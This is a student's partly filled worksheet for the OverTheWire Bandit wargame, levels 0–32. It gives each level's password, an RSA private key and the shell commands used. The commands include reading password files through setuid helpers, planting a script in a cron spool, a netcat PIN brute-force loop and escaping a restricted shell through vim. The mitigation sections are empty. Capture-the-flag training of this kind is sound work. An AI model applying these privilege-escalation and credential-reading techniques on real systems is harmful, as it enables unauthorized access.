# OverTheWire Bandit Project

## Student Information

* Student name: **enter name here**
* NetId: **enter NetId here**


## Project Description

In this project, you will be complete the Bandit challenges at <https://overthewire.org/wargames/bandit/>. For each challenge, you will complete the following worksheet describing:
1. The credentials found in the challenge.
2. How you solved the challenge. Include any JavaScript or other scripts necessary to retrieve the credentials.
3. What mitigations should be used to address the exploit.

In the workshop, the challenges are named based on the username used to login to the shell for that challenge. For example, the challenge labeled "Bandit 10" will be logged into with the username bandit10, and the solution will be the credentials for the user bandit11.

You can find a basic guide for markdown formatting [here](https://www.markdownguide.org/basic-syntax/). In particular, note the [code section](https://www.markdownguide.org/basic-syntax/#code) which should be used to annotate any code or commands used in your writeup.

## Hints
There are hints for each challenge on the [Bandit](https://overthewire.org/wargames/bandit/) webpage.

Below are several additional hints:
* Bandit 24: The netcat server dies if sent too much input. Limit how much content you send per connection.
* Bandit 25: This level is only finished once you have the password for bandit26. The ssh key along is insufficient. Also, how does `vi` factor into all of this?
* Bandit 28–30: Core `git` features include commits, branches, and tags.
* Bandit 32: `sh` has access to argc and argv.


## Challenges

---
### Bandit 00

#### Credentials
bandit0
bandit0

#### How you passed the challenge
cat readme

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 01

#### Credentials
bandit1
NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL

#### How you passed the challenge
cat ./-

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 02

#### Credentials
bandit2
rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

#### How you passed the challenge
cat spaces\ in\ this\ filename 

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 03

#### Credentials
bandit3
aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG

#### How you passed the challenge
cd inhere
ls -lat
cat .hidden

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 04

#### Credentials
bandit4
2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe

#### How you passed the challenge
cd inhere
cd -lat
cd .
cat cat ./-file07

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 05

#### Credentials
bandit5
lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR

#### How you passed the challenge
cd inhere/
find -size -1034c -exec ls -lat "{}" \;
cat ./maybehere07/.file2


#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 06

#### Credentials
bandit6
P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU

#### How you passed the challenge
find / -user bandit7 -group bandit6 -size -34c -exec ls -lat "{}" \;
cat /var/lib/dpkg/info/bandit7.password

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 07

#### Credentials
bandit7
z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S

#### How you passed the challenge
cat data.txt | grep millionth

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 08

#### Credentials
bandit8
TESKZC0XvTetK0S9xNwm25STk5iWrBvP

#### How you passed the challenge
tr ' ' '\n' < data.txt | sort | uniq -u

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 09

#### Credentials
bandit9
EN632PlfYiZbn3PhVK3XOGSlNInNE00t

#### How you passed the challenge
grep --text '==*' data.txt

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 10

#### Credentials
bandit10
G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s

#### How you passed the challenge
cat data.txt | base64 -d

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 11

#### Credentials
bandit11
6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM

#### How you passed the challenge
tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 12

#### Credentials
bandit12
JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv

#### How you passed the challenge
mkdir /tmp/gschintu
cp data.txt /tmp/gschintu
cd /tmp/gschintu
xxd -r data.txt newdata
mv newdata newdata.gz
gzip -d newdata.gz
mv newdata newdata.bz2
bzip2 -d newdata.bz2 
mv newdata newdata.gz
gzip -d newdata.gz
tar -xvf newdata 
tar -xvf data5.bin
mv data6.bin data7.bz2
bzip2 -d data7.bz2
tar -xvf data7
mv data8.bin data9.gz
gzip -d data9.gz
cat data9

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 13

#### Credentials
bandit13
wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw

#### How you passed the challenge
ssh -i sshkey.private bandit14@localhost -p 2220
cat /etc/bandit_pass/bandit14

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 14

#### Credentials
bandit14
fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq

#### How you passed the challenge
nc localhost 30000

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 15

#### Credentials
bandit15
jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt

#### How you passed the challenge
openssl s_client -connect localhost:30001

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 16

#### Credentials
bandit16
JQttfApK4SeyHwDlI9SXGR50qclOAil1

#### How you passed the challenge
nmap -script ssl-cert -p 31000-32000 localhost
openssl s_client -connect localhost:31790


#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 17

#### Credentials
bandit17

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

#### How you passed the challenge
diff passwords.new passwords.old

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 18

#### Credentials
bandit18
hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg


#### How you passed the challenge
ssh -t bandit18@bandit.labs.overthewire.org -p 2220 /bin/sh
Cat readme

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **


---
### Bandit 19

#### Credentials
bandit19
awhqfNnAbc1naukrpqDYcF95h7HoMTrC

#### How you passed the challenge
./bandit20-do cat /etc/bandit_pass/bandit20

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 20

#### Credentials
Bandit20
VxCazJaVykI6W36BkBU0mJTCM8rR95XT

#### How you passed the challenge
#Open a new terminal or use screen command to bandit20
#In the new terminal use the following command to listen to port 3000 and pass the bandit20 password:
echo VxCazJaVykI6W36BkBU0mJTCM8rR95XT | nc -lvN 3000
#in another terminal for bandit20 run:
./suconnect 3000

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 21

#### Credentials
Bandit21
NvEJF7oVjkddltPSrdKEFOllh9V1IBcq

#### How you passed the challenge
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 22

#### Credentials
Bandit22
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff

#### How you passed the challenge
Cat /etc/cron.d/cronjob_bandit23
Cat /usr/bin/cronjob_bandit23.sh
echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
cat /tmp/8ca319486bfbbc3663ea0fbe81326349

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 23

#### Credentials
Bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

#### How you passed the challenge
cat /usr/bin/cronjob_bandit24.sh
mkdir /tmp/gschintu
Cd /tmp/gschintu
Nano sgetpwd.sh

#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/rand/b24pwd


Touch b24pwd
chmod 777 -R /tmp/gschintu
cp sgetpwd.sh /var/spool/bandit24/foo/

Wait about 1-2 minutes 

cat b24pwd





#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 24

#### Credentials
Bandit24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

#### How you passed the challenge
Mkdir /tmp/gschintu/bruteforce
Cd /tmp/gschintu/bruteforce
nano brute.sh

#!/bin/bash


password="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"

for i in {0000..9999};
do
  echo $password $i

done

chmod +x brute.sh

./brute.sh > brutecomb.txt

nc localhost 30002 <brutecomb.txt

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 25

#### Credentials
bandit25
p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d


#### How you passed the challenge
cat /etc/passwd | grep bandit26
cat /usr/bin/showtext

Save bandit26.sshkey 

Open a new terminal with a very small window so that we can trigger the more

ssh -i bandit26.sshkey bandit26@localhost -p 2220
Press v for Vim editor

Inside vim run the following to see bandit26 password:

:e /etc/bandit_pass/bandit26


#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 26

#### Credentials
Bandit26
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1

#### How you passed the challenge
Open a new terminal with a very small window so that we can trigger the more
Press v for Vim editor

:set shell=bin/bash
:shell
cat /etc/bandit_pass/bandit26

Get password for bandit27

./bandit27-do cat /etc/bandit_pass/bandit27 

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 27

#### Credentials
Bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS

#### How you passed the challenge
Cd /tmp/gschintu/
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
Cd repo
Cat README

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 28

#### Credentials
bandit28
AVanL161y9rsbcJIsFHuw35rjaOM19nR

#### How you passed the challenge
Mkdir /tmp/gschintu/bandit28
Cd /tmp/gschintu/bandit28
git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
Cd repo
Git log
git log -p -1


#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 29

#### Credentials
Bandit29
tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S

#### How you passed the challenge
mkdir /tmp/gschintu/bandit29
cd /tmp/gschintu/bandit29/
git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
Cd repo
Git branch -r
Git checkout dev
Cat README.md


#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 30

#### Credentials
Bandit30
xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS

#### How you passed the challenge
mkdir /tmp/gschintu/bandit30
cd /tmp/gschintu/bandit30
git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
Cd repo
git tag
Git tag secret




#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 31

#### Credentials
Bandit31
OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt


#### How you passed the challenge
mkdir /tmp/gschintu/bandit31
Cd /tmp/gschintu/bandit31
git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
Cd repo
echo 'May I come in?' > key.txt
git add -f key.txt
git commit -am"this is what you want?"
git push -u origin master


#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **



---
### Bandit 32

#### Credentials
Bandit32
rmCBvG56y58BXzv98yZGdO7ATVL5dW8y


#### How you passed the challenge
$0
cat /etc/bandit_pass/bandit33

#### What sins are evidenced in this challenge
** Sins here **

#### How could those sins be mitigated
** Mitigations here **


